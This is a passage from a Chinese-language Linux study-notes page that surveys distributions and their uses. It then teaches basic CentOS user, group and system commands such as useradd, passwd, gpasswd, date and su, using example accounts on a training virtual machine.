bug的几率便低了很多。Slackware的版本更新周期较长（大约1年），但是新版本的软件仍然不间断的提供给用户下载。</p><p><strong>7、openSUSE介绍</strong></p><p>SUSE是德国最著名的Linux发行版，在全世界范围中也享有较高的声誉。SUSE自主开发的软件包管理系统也大受好评。SUSE于2003年年末被Novell收购。SUSE在收购之后的发布显得比较混乱，比如9.0版本是收费的，而10.0版本（也许由于各种压力）又免费发布。这使得一部分用户感到困惑，也转而使用其它发行版本。最近还跟微软扯到了一起。但是瑕不掩瑜，SUSE仍然是一个非常专业、优秀的发行版。</p><p>openSUSE 项目是由Novell公司资助的全球性社区计划，旨在推进 Linux 的广泛使用。这个计划提供免费的openSUSE 操作系统。这里是一个由普通用户和开发者共同构成的社区，我们拥有一个共同的目标—创造世界上最好用的 Linux 发行版。openSUSE 是 Novell 公司发行的企业级 Linux 产品的系统基础。</p><p>openSUSE 项目是由Novell 发起的开源社区计划。 旨在推进 Linux 的广泛使用。提供了自由简单的方法来获得世界上最好用的 Linux 发行版，SUSE Linux。openSUSE 项目为 Linux 开发者和爱好者提供了开始使用 Linux 所需要的一切。</p><p><strong>8、中国大陆的Linux发行版</strong></p><p>红旗Linux(RedflagLinux) ，冲浪Linux(Xteam Linux) ，蓝点Linux ， GNU/Linux，OpenDesktop等等 。</p><p><strong>9、 台湾地区的Linux发行版</strong></p><p>鸿奇Linux</p><p><strong>目前最著名的发行版本：Debian，ubuntu、OpenSuse(原Suse)、CentOS、fedora等。国内比较著名的红旗Linux版本</strong></p><blockquote><p>对于上面的知识我们做下重点总结</p><ul class="lvl-1"><li class="lvl-2"><strong>redhat</strong>：目前，全球最大的<strong>linux</strong>发行厂商，功能全面、稳定。<ul class="lvl-3"><li class="lvl-4"><strong>Redhat</strong> 被 <strong>IBM</strong> 收购!</li></ul></li><li class="lvl-2"><strong>ubuntu</strong>：目前，是linux桌面操作系统做的最好的。</li><li class="lvl-2"><strong>centos</strong>：免费版的redhat，<strong>centos</strong> 基于 <strong>redhat</strong> 发行版基础之上，再重新编译发布的版本。<ul class="lvl-3"><li class="lvl-4">目前 <strong>centos</strong> 已经被 <strong>Redhat</strong> 公司收购，但是依然免费</li></ul></li></ul></blockquote><h2 id="1-7-Linux-应用领域">1.7 Linux 应用领域</h2><p>今天各种场合都有使用各种 Linux 发行版，从嵌入式设备到超级计算机，并且在服务器领域确定了地位。在企业级开发中，我们通常使用Linux作为我们的服务器。</p><p>比如：服务器系统Web应用服务器、数据库服务器、接口服务器、DNS、FTP等等；</p><p>嵌入式系统路由器、防火墙、手机、PDA、IP 分享器、交换器、家电用品的微电脑控制器等等，高性能运算、计算密集型应用Linux有强大的运算能力。</p><p><strong>目前 Linux 不仅在家庭与企业中使用，并且在政府中也很受欢迎</strong>。</p><ul class="lvl-0"><li class="lvl-2"><p>巴西联邦政府由于支持 Linux 而世界闻名。</p></li><li class="lvl-2"><p>有新闻报道俄罗斯军队自己制造的 Linux 发布版的，做为 G.H.ost 项目已经取得成果。</p></li><li class="lvl-2"><p>印度的 Kerala 联邦计划在向全联邦的高中推广使用 Linux。</p></li><li class="lvl-2"><p>中华人民共和国为取得技术独立，在龙芯处理器中排他性地使用 Linux。</p></li><li class="lvl-2"><p>在西班牙的一些地区开发了自己的 Linux 发布版，并且在政府与教育领域广泛使用，如 Extremadura 地区的 gnuLinEx 和 Andalusia 地区的 Guadalinex。</p></li><li class="lvl-2"><p>葡萄牙同样使用自己的 Linux 发布版 Caixa Mágica，用于 Magalh?es 笔记本电脑和 e-escola 政府软件。</p></li><li class="lvl-2"><p>法国和德国同样开始逐步采用 Linux。</p></li></ul><h2 id="1-8-Linux之CentOS"><strong>1.8 Linux之CentOS</strong></h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">前面章节介绍了一些Linux的基本知识，前已经对Linux有了一个初步的认识，也知道了在Linux发行版中有各个家族的发行版本；比如比较知名的ubuntu、CentOS，在今天的Linux课程中我们将采用发行版CentOS作为我们Linux课程的讲解内容。<br></code></pre></td></tr></table></figure><p><strong>CentOS</strong>，是基于 Red Hat Linux 提供的可自由使用源代码的企业级 Linux 发行版本；是一个稳定，可预测，可管理和可复制的免费企业级计算平台</p><p><strong>主要特点:</strong></p><p>1.主流： 目前的Linux操作系统主要应用于生产环境，主流企业级Linux系统仍旧是RedHat或者CentOS<br>2.免费： RedHat 和CentOS差别不大，CentOS是一个基于Red Hat Linux 提供的可自由使用源代码的企业级Linux发行版本<br>3.更新方便：CentOS独有的yum命令支持在线升级，可以即时更新系统，不像RED HAT那样需要花钱购买支持服务！</p><p><strong>我们在当前课程中的环境：</strong></p><p>Windows7 , VMware Workstation15.02, CentOS Linux release 7.6.1810</p><h2 id="1-9-总结">1.9 总结</h2><p>当前章节主要介绍了Linux发行的主要版本（我们使用的是CentOS Linux release 7.6.1810 ）、以及与Unix、Windows系统的区别；主要让学生了解Linux是基于Unix的以及与Windows一样，Linux也是操作系统即可。</p><h1>2 系统与设置命令</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">在前面的两个章节中，我们主要介绍了Linux基本知识和虚拟机的安装，从当前章节开始，我们一起学习下Linux的基本命令，在当前章节，我们先简单的学习下一些系统的基本命令，慢慢的由浅入深，在后面的章节中我们将学习其他的命令比如文件操作、备份压缩等<br></code></pre></td></tr></table></figure><h2 id="2-1-学习命令的原因">2.1 学习命令的原因</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">命令我们可以理解成在Windows中我们常常为了查看<span class="hljs-built_in">ip</span>输入的ipconfig，在Linux中也有很多的命令，比如操作目录、文件、网络、磁盘等等命令<br></code></pre></td></tr></table></figure><ul class="lvl-0"><li class="lvl-2"><p>Linux刚面世时并没有图形界面, 所有的操作全靠命令完成, 如 <strong>磁盘操作、文件存取、目录操作、进程管理、文件权限</strong> 设定等</p></li><li class="lvl-2"><p>在职场中，大量的 <strong>服务器维护工作</strong> 都是在 远程 通过SSH客户端 来完成的， 并没有图形界面， 所有的维护工作都需要通过命令来完成</p></li></ul><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576225778294.png" alt="1576225778294"></p><p>在职场中， 作为后端程序员或者运维， 必须要或多或少的掌握一些Linux常用的终端命令</p><ul class="lvl-0"><li class="lvl-2"><p>Linux发行版本的命令大概有200多个， 但是常用的命令只有几十个而已</p></li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">总结<br>学习终端命令的技巧：<br><span class="hljs-bullet">- </span>不需要死记硬背， 对于常用命令， 记住语法是关键，在用的时候去查下参数选项，有的很常用的命令，用的多自然就记住了<br><span class="hljs-bullet">- </span>不要尝试一次学会所有的命令， 有些命令是非常不常用的，临时遇到，就去根据语法找参数选项<br></code></pre></td></tr></table></figure><h2 id="2-2-Linux-用户和用户组管理">2.2 Linux 用户和用户组管理</h2><h3 id="2-2-1-Linux账号管理">2.2.1 Linux账号管理</h3><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs erlang">从当前章节开始，我们正式进入CentOS的学习，我们先从简单的命令开始，比如操作账号、用户组、系统管理等。<br>在实际使用场景中，用户账号的管理主要涉及到用户账号的添加、修改和删除操作。<br>现在，我们就通过命令的方式添加用户账号（账号名字可以自定义，但是是要符合书写规范）<br>在操作前，确保我们的SecureCRT成功连接到了虚拟机.<br>下面的章节不在赘述SecureCRT，默认已经成功连接。<br></code></pre></td></tr></table></figure><h4 id="1-添加用户">1) 添加用户</h4><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">我们在Windows创建账号主要是是控制面板</span><span class="hljs-literal">--</span><span class="hljs-comment">用户账户</span><span class="hljs-literal">--</span><span class="hljs-comment">创建一个新账户，这是在Windows创建账户的流程，而在Linux中，我们可以通过命令的方式进行创建账户</span><br></code></pre></td></tr></table></figure><p><strong>使用者权限：管理员用户</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">useradd 选项 用户名<br></code></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>选项:</p><ul class="lvl-2"><li class="lvl-4">-c comment 指定一段注释性描述。</li><li class="lvl-4">-d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。</li><li class="lvl-4">-g 用户组 指定用户所属的用户组。</li><li class="lvl-4">-G 用户组，用户组 指定用户所属的附加组。</li><li class="lvl-4">-s Shell文件 指定用户的登录Shell。</li><li class="lvl-4">-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。</li></ul></li><li class="lvl-2"><p>用户名:</p><p>指定新账号的用户名(后续我们可以使用这个用户名进行系统登录)。</p></li></ul><p>添加用户czbk（传智播客的首拼）执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">useradd  czbk<br></code></pre></td></tr></table></figure><p>我们使用useradd命令创建了一个用户czbk</p><p>useradd 可用来建立用户帐号。帐号建好之后，再用 passwd 设定帐号的密码。</p><p>执行如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576043805214.png" alt="1576043805214"></p><p>由上图我们发现，我们在使用useradd新增用户的时候，出现了权限不足，也就是说我们使用用户itcast没有创建用户的权限。</p><p>我们通过管理员账号root进行创建，首先我们从控制台中切换到root</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">su root<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576042675759.png" alt="1576042675759"></p><p>在 密码的地方输入我们的root密码【root】即可进入到root用户下。</p><p>我们在root下继续创建czbk用户</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576043845543.png" alt="1576043845543"></p><p>以下是useradd常用选项</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576049906893.png" alt="1576049906893"></p><h4 id="2-用户口令">2) 用户口令</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">引子：<br>相当于我们在Windows系统中给个用户更改密码，只是我们在CentOS中是更改密码是通过命令完成的。<br></code></pre></td></tr></table></figure><p>用户管理的一项重要内容是用户口令的管理。用户账号刚创建时没有口令，但是被系统锁定，无法使用，必须为其指定口令后才可以使用</p><p><strong>使用者权限：管理员用户</strong></p><p>指定和修改用户口令的Shell命令是<code>passwd</code>。超级用户可以为自己和其他用户指定口令，普通用户只能用它修改自己的口令。命令的格式为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">passwd 选项 用户名<br></code></pre></td></tr></table></figure><p>可使用的选项：</p><ul class="lvl-0"><li class="lvl-2"><p>-l 锁定口令，即禁用账号。</p></li><li class="lvl-2"><p>-u 口令解锁。</p></li><li class="lvl-2"><p>-d 使账号无口令。</p></li><li class="lvl-2"><p>-f 强迫用户下次登录时修改口令。</p></li></ul><p>设置当前用户的口令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">passwd czbk<br></code></pre></td></tr></table></figure><p>此处我们设置密码和itcast账号密码一致，为【Itheima888】</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576044108094.png" alt="1576044108094"></p><h4 id="3-修改用户">3) 修改用户</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">相当于我们在Windows系统中修改一个用户，只是我们在CentOS中是修改用户是通过命令完成的。<br></code></pre></td></tr></table></figure><p>usermod 命令通过修改系统帐户文件来修改用户账户信息</p><p>修改用户账号就是根据实际情况更改用户的有关属性，如用户号、主目录、用户组、登录Shell等。</p><p><strong>使用者权限：管理员用户</strong></p><p>修改已有用户的信息使用<code>usermod</code>命令，其格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">usermod 选项 用户名<br></code></pre></td></tr></table></figure><p>下面命令将用户czbk用户名修改成czbk2019</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">usermod -l czbk2019  czbk<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576046509680.png" alt="1576046509680"></p><p>以下是usermod常用选项</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576049946335.png" alt="1576049946335"></p><h4 id="4-删除用户">4) 删除用户</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">相当于我们在Windows系统中删除一个用户，只是我们在CentOS中是删除用户是通过命令完成的。<br></code></pre></td></tr></table></figure><p>假如我们其中一个用户的账号不再使用，可以从系统中删除。删除用户账号就是要将/etc/passwd等系统文件中的该用户记录删除，必要时还删除用户的主目录。</p><p><strong>使用者权限：管理员用户</strong></p><p>删除一个已有的用户账号使用<code>userdel</code>命令，其格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">userdel 选项 用户名<br></code></pre></td></tr></table></figure><p>-f：强制删除用户，即使用户当前已登录;</p><p>-r：删除用户的同时，删除与用户相关的所有文件</p><p>此命令删除用户czbk2019</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">userdel czbk2019<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576047020612.png" alt="1576047020612"></p><p>成功删除用户czbk2019</p><p>以下是userdel常用选项</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576049978916.png" alt="1576049978916"></p><h3 id="2-2-2-Linux用户组">2.2.2 Linux用户组</h3><p><strong>引子：</strong></p><p><strong>为了方便用户管理, 提出了 组 的概念, 如下图所示</strong></p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576572808687.png" alt="1576572808687"></p><p><strong>新增一个账户，它默认属于自己（账户）的组</strong></p><p><strong>比如新建账户【张三】，那么它默认对应的组就是张三</strong></p><p><strong>一个用户可以有一个或者多个组</strong></p><p><strong>假如说（如上图），我们在企业级开发过程中，我们有多个组，其中一个开发组对应三个账户，张三、李四、王五、如果就像上面提到的，一个用户默认对应一个组，那么三个账户张三、李四、王五就有了三个不同的组，如果大家都操做一个文件，在进行权限分配的时候，就要对不同的三个组进行授权，显然这样是不合理的，因为太过繁琐。</strong></p><p><strong>所以，才有了组（新建组）的概念，我们把张三、李四、王五统一放到【开发组】，在对文件授权的时候，我们只对【开发组】进行授权由此，这样的话【张三、李四、王五】都有相等的权利操作了。</strong></p><h4 id="1-增加用户组">1) 增加用户组</h4><p>新增一个用户组（组名可见名知意，符合规范即可），然后将用户添加到组中</p><p><strong>使用者权限：管理员用户</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">groupadd 选项 用户组<br></code></pre></td></tr></table></figure><p>使用的选项有：</p><ul class="lvl-0"><li class="lvl-2"><p>-g GID 指定新用户组的组标识号（GID）。</p></li><li class="lvl-2"><p>-o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同</p></li></ul><p>新增用户组czbk-it</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">groupadd czbk-it<br></code></pre></td></tr></table></figure><p>上面的命令向系统中增加了一个新组czbk-it，新组的组标识号是在当前已有的最大组标识号的基础上加1</p><p>以下是groupadd常用选项</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576050003979.png" alt="1576050003979"></p><h4 id="2-修改用户组">2) 修改用户组</h4><p><strong>使用者权限：管理员用户</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">groupmod 选项 用户组<br></code></pre></td></tr></table></figure><p>常用的选项有：</p><ul class="lvl-0"><li class="lvl-2"><p>-g GID 为用户组指定新的组标识号。</p></li><li class="lvl-2"><p>-o 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。</p></li><li class="lvl-2"><p>-n新用户组 将用户组的名字改为新名字</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">groupmod  -n czbk-it-2019  czbk-it<br></code></pre></td></tr></table></figure><p>上面的命令将组czbk-it的组名修改为czbk-it-2019。</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576047810973.png" alt="1576047810973"></p><p>以下是groupmod常用选项</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576050645612.png" alt="1576050645612"></p><h4 id="3-查询用户所属组">3) 查询用户所属组</h4><p>在查询用户所属的用户组前，我们先增加一个用户ituser-groups</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">useradd ituser-groups<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576050663149.png" alt="1576050663149"></p><p>要查询一个用户属于哪个用户组，使用groups命令，其格式如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">groups 用户名<br></code></pre></td></tr></table></figure><p>查询用户ituser-groups属于某个用户组，执行groups命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">groups ituser-groups<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576050797421.png" alt="1576050797421"></p><p>由此可见，ituser-groups用户属于用户组ituser-groups（用户组默认与用户名一样）</p><h4 id="4-删除用户组">4) 删除用户组</h4><p><strong>使用者权限：管理员用户</strong></p><p>要删除一个已有的用户组，使用groupdel命令，其格式如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">groupdel 用户组<br></code></pre></td></tr></table></figure><p>删除czbk-it-2019用户组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">groupdel czbk-it-2019<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576051028346.png" alt="1576051028346"></p><p>删除成功</p><p>以下是groupdel常用选项</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576050031859.png" alt="1576050031859"></p><h3 id="2-2-3-将用户添加到组">2.2.3 将用户添加到组</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">引子：<br>在上面我们学习如何新增用户，也学习了如何新增用户组，在当前的小节中，我们新建一个用户、新建一个用户组、然后把新建的用户添加到新的组中<br>在实际开发过程中，我们通常把多个用户按照业务需求归并到统一的一个组中，进行有序管理<br></code></pre></td></tr></table></figure><p>1、创建一个新的组，并添加组ID（需要切换到root用户）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">groupadd -g 8888 itbj2020group<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576137760529.png" alt="1576137760529"></p><p>2、创建3个用户（需要切换到root用户）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">useradd  itbeijinguser1<br>useradd  itbeijinguser2<br>useradd  itbeijinguser3<br></code></pre></td></tr></table></figure><p>3、将上面三个用户添加到组itbj2020group</p><p>我们通过passwd命令将三个用户添加到组</p><p><strong>什么是gpasswd：</strong></p><p>gpasswd 是 Linux 下工作组文件 /etc/group 和 /etc/gshadow 管理工具，用于将一个用户添加到组或者从组中删除。</p><p>语法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gpasswd [可选项] 组名<br></code></pre></td></tr></table></figure><p><strong>将上面的三个用户使用gpasswd添加到组（需要切换到root用户）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gpasswd -a itbeijinguser1 itbj2020group<br>gpasswd -a itbeijinguser2 itbj2020group<br>gpasswd -a itbeijinguser3 itbj2020group<br></code></pre></td></tr></table></figure><p><strong>执行如下</strong></p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576139901757.png" alt="1576139901757"></p><p><strong>查看用户组下所有用户（所有用户）</strong></p><blockquote><p>注意</p><p>此处的grep命令我们将在文件管理章节详细讲解，这里先使用它查看下效果</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">grep &#x27;itbj2020group&#x27; /etc/group<br></code></pre></td></tr></table></figure><p>执行效果如下（或者直接打开/etc/group文件都可以）</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576139987480.png" alt="1576139987480"></p><p>由上图可知：三个用户全部都加入到了itbj2020group组。</p><h2 id="2-3-系统管理">2.3 系统管理</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">系统管理，说的就是我们的CentOS系统，它不同于Windwos，CentOS是字符界面，我们需要通过命令进行操作，在当前章节，我们先从基本命令学起，比如创建用户、设置密码、修改用户以及用户组的相关操作。也为我们后面的章节打下基础<br></code></pre></td></tr></table></figure><h3 id="2-3-1-日期管理">2.3.1 日期管理</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">当前日期如果通过<span class="hljs-built_in">date</span>进行设置，在系统重启后不会保存<span class="hljs-built_in">date</span>的设置，常用的只是通过<span class="hljs-built_in">date</span>命令查看日期<br></code></pre></td></tr></table></figure><p>date 可以用来显示或设定系统的日期与时间</p><p>使用者权限：所有用户</p><p><strong>语法如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">date [参数选项]<br></code></pre></td></tr></table></figure><p>参数</p><p>-d&lt;字符串&gt;：显示字符串所指的日期与时间。字符串前后必须加上双引号；<br>-s&lt;字符串&gt;：根据字符串来设置日期与时间。字符串前后必须加上双引号；<br>-u：显示GMT；<br>–help：在线帮助；<br>–version：显示版本信息</p><p>1、设置时间</p><p>用 -s选项可以设置系统时间，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">date -s &quot;2019-12-11 16:15:00&quot;<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576052178420.png" alt="1576052178420"></p><p>2、显示时间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">date<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576052234012.png" alt="1576052234012"></p><p><strong>（1）UTC</strong></p><p>协调世界时，又称世界统一时间、世界标准时间、国际协调时间。由于英文（CUT）和法文（TUC）的缩写不同，作为妥协，简称UTC。。</p><p><strong>（2）GMT</strong></p><p>即<a href="https://baike.baidu.com/item/%E6%A0%BC%E6%9E%97%E5%B0%BC%E6%B2%BB/3065623">格林尼治</a> 平太阳时间，是指格林尼治所在地的标准时间，也是表示地球自转速率的一种形式</p><p>**外文名:**Universal Time</p><p><strong>其他外文名</strong>G.M.T.(Greenwich Mean Time)</p><p><strong>（3）CST</strong></p><p>北京时间 （中国国家标准时间）<br><strong>北京时间是中国采用国际时区东八时区的区时作为标准时间</strong>。北京时间并不是北京（东经116.4°）的地方时间，而是东经120°的地方时间，故东经120度地方时比北京的地方时早约14分半钟。因为北京处于国际时区划分中的东八区，同格林尼治时间（世界时）整整相差8小时（即北京时间=世界时+8小时），故命名为“北京时间”。东八区包括的范围从东经112.5°到东经127.5°，以东经120°为中心线，东西各延伸7.5°，总宽度为15°的区域。<br><strong>而中国幅员辽阔，东西相跨5个时区（即东五区、东六区、东七区、东八区、东九区5个时区）授时台必须建在地理中心地带，从而也就产生了长短波授。“北京时间”与“北京当地时间”是两个概念，  “北京时间”的发播不在北京，而在陕西蒲城（处于东七区）</strong></p><p><strong>（4）东八区</strong></p><p>东八区（<a href="https://baike.baidu.com/item/UTC">UTC</a>/<a href="https://baike.baidu.com/item/GMT/6026868">GMT</a>+08:00）是比<a href="https://baike.baidu.com/item/%E4%B8%96%E7%95%8C%E5%8D%8F%E8%B0%83%E6%97%B6%E9%97%B4/8036498">世界协调时间</a>（UTC）/<a href="https://baike.baidu.com/item/%E6%A0%BC%E6%9E%97%E5%B0%BC%E6%B2%BB%E6%97%B6%E9%97%B4/410004">格林尼治时间</a>（GMT）快8小时的时区，理论上的位置是位于<a href="https://baike.baidu.com/item/%E4%B8%9C%E7%BB%8F/8661846">东经</a>112.5度至127.5度之间，是东盟标准的其中一个候选时区。当格林尼治标准时间为0:00时，东八区的标准时间为08:00</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">总结：<br>上面提到了很多知识：即UTC/GMT/CST/东八区<br>总结一下就是，北京时间<span class="hljs-comment">(中国国家标准时间CST)</span>采用东八区区时，即：<br>协调世界时<span class="hljs-comment">(UTC)</span><span class="hljs-number">+8</span>  /   格林尼治时间<span class="hljs-comment">(GMT)</span><span class="hljs-number">+8</span><br>也就是说<span class="hljs-number">+8</span>后的时间才是北京时间<br></code></pre></td></tr></table></figure><h3 id="2-3-2-显示用户">2.3.2 显示用户</h3><p>logname命令用于显示用户名称。</p><p>执行logname指令，它会显示目前用户的名称</p><p><strong>语法为如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">logname [--help][--version]<br></code></pre></td></tr></table></figure><p><strong>参数</strong>：</p><ul class="lvl-0"><li class="lvl-2"><p>–help 　在线帮助。</p></li><li class="lvl-2"><p>–vesion 　显示版本信息。</p></li></ul><p>显示登录账号的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">logname<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576053311351.png" alt="1576053311351"></p><h3 id="2-3-3-su切换账户">2.3.3 su切换账户</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">引子：<br>比如我们在新增用户、修改用户或者操作用户组的时候常常需要切换到管理员账户，这个时候，我们就可以使用<span class="hljs-keyword">su</span>进行快速切换<br></code></pre></td></tr></table></figure><p>su命令用于变更为其他使用者的身份，除 root 外，需要键入该使用者的密码。</p><p>使用权限：所有使用者。</p><p><strong>语法如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">su <br></code></pre></td></tr></table></figure><p>变更帐号为 root 并在执行 ls 指令后退出返回原使用者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">su -c ls root<br></code></pre></td></tr></table></figure><p><img 